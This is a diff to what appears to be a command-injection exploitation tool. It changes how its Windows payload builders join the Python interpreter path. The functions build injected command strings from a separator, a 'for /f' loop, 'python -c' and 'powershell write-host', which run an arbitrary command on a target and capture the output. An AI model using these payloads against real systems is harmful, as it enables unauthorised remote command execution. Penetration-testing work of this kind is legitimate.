@@ -48,7 +48,7 @@ __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, TAG, randv1, randv2):
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"print '" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "'\""
+    python_payload = settings.WIN_PYTHON_DIR + " -c \"print '" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "'\""
     payload = (separator +
               "for /f \"delims=\" %i in ('cmd /c " + 
               python_payload +
@@ -94,7 +94,7 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
     else:
       payload = (separator +
                 "for /f \"delims=\" %i in ('" + 
-                settings.WIN_PYTHON_DIR + "python.exe -c \"import os; os.system('powershell.exe -InputFormat none write-host " + TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
+                settings.WIN_PYTHON_DIR + " -c \"import os; os.system('powershell.exe -InputFormat none write-host " + TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
                 "') do @set /p =%i< nul"
                 )
                                                                       
